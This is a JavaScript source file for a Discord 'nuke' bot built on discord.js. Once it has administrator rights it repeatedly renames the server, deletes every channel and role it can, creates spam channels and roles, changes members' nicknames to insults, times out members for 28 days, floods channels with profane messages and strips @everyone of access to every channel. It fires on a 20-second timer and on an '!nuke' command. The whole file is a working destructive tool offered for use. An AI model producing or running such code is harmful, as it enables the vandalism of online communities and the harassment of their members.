require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const CHAOS_INTERVAL = Number(process.env.CHAOS_INTERVAL) || 20 * 1000; // 20 seconds
const MAX_ACTIONS_PER_TICK = Number(process.env.MAX_ACTIONS_PER_TICK) || 18;

// Optional: channel that will never be deleted
const PROTECTED_CHANNEL = 'aaaaaaaa';

if (!TOKEN) {
  console.error('❌ TOKEN is missing!');
  process.exit(1);
}

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'GET NUKED', 'SERVER DESTROYED', 'OWNED', 'RIP SERVER',
  'CHAOS WON', 'NO SURVIVORS', 'THE END', 'BOT OWNS THIS', 'GOODBYE'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'get-fucked', 'no-escape', 'owned',
  'rip', 'chaos', 'void', 'pain', 'end', 'dead-server',
  'bot-was-here', 'lmao', 'gg', 'destroyed-by-bot'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'BOT PROPERTY', 'NO HOPE',
  'GET FUCKED', 'SERVER CORPSE', 'VICTIM', 'DESTROYED'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'No Hope', 'Bot Property', 'RIP'
];

const MESSAGES = [
  '**SERVER NUKED**', 'GET FUCKED', 'THIS SERVER IS DONE',
  'NO SURVIVORS', 'OWNED BY THE BOT', 'GOODBYE', 'RIP',
  'YOU CANNOT STOP THIS', 'THE END', 'NUKE LEVEL ACTIVATED'
];

// ================== HELPERS ==================
function randomItem(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}
function chance(percent) {
  return Math.random() * 100 < percent;
}

// ================== NUKE ACTIONS ==================
const nukeActions = [
  // Rename server
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
    console.log('🔥 Server renamed');
  },

  // Delete channels (except protected)
  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    for (const channel of channels) {
      if (channel.name === PROTECTED_CHANNEL) continue;
      await channel.delete('NUKE').catch(() => {});
    }
    console.log('🗑️ Channels deleted');
  },

  // Create spam channels
  async (guild) => {
    for (let i = 0; i < 5; i++) {
      const ch = await guild.channels.create({
        name: randomItem(CHANNEL_NAMES),
        type: ChannelType.GuildText,
      }).catch(() => null);
      if (ch) {
        await ch.send(randomItem(MESSAGES)).catch(() => {});
      }
    }
    console.log('✨ Spam channels created');
  },

  // Delete all roles
  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    for (const role of roles) {
      if (role.id === guild.id) continue; // @everyone
      if (!role.editable) continue;
      await role.delete('NUKE').catch(() => {});
    }
    console.log('🗑️ Roles deleted');
  },

  // Create spam roles
  async (guild) => {
    for (let i = 0; i < 4; i++) {
      await guild.roles.create({
        name: randomItem(ROLE_NAMES),
        color: Colors.Red,
        reason: 'NUKE',
      }).catch(() => {});
    }
  },

  // Mass nickname
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
    }
    console.log('👤 Mass nicknames');
  },

  // Mass timeout
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.moderatable) continue;
      await member.timeout(28 * 24 * 60 * 60 * 1000, 'NUKE').catch(() => {}); // 28 days
    }
    console.log('⏳ Mass timeout');
  },

  // Spam messages
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    for (const channel of channels.values()) {
      for (let i = 0; i < 3; i++) {
        await channel.send(randomItem(MESSAGES)).catch(() => {});
      }
    }
    console.log('💬 Mass spam');
  },

  // Permission destroy
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    for (const channel of channels.values()) {
      await channel.permissionOverwrites.edit(guild.roles.everyone, {
        ViewChannel: false,
        SendMessages: false,
        Connect: false,
      }).catch(() => {});
    }
    console.log('🔐 Permissions destroyed');
  },

  // Bot nickname
  async (guild) => {
    await guild.members.me.setNickname('NUKE BOT').catch(() => {});
  },
];

// ================== MAIN ==================
async function doNuke(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
    console.log('⚠️ Missing Administrator permission');
    return;
  }

  console.log(`\n======== NUKE LEVEL on ${guild.name} ========`);

  const selected = [...nukeActions].sort(() => 0.5 - Math.random()).slice(0, MAX_ACTIONS_PER_TICK);

  for (const action of selected) {
    try {
      await action(guild);
      await new Promise(r => setTimeout(r, 300));
    } catch (err) {
      console.error('❌', err.message);
    }
  }
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 NUKE LEVEL ACTIVE | Every ${CHAOS_INTERVAL / 1000}s`);
  console.log('This will destroy the server.');

  setInterval(async () => {
    const guild = TARGET_GUILD_ID
      ? client.guilds.cache.get(TARGET_GUILD_ID)
      : client.guilds.cache.first();
    if (guild) await doNuke(guild);
  }, CHAOS_INTERVAL);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await message.reply('💣 **NUKE LEVEL ACTIVATED**');
    await doNuke(message.guild);
  }
});

client.login(TOKEN);
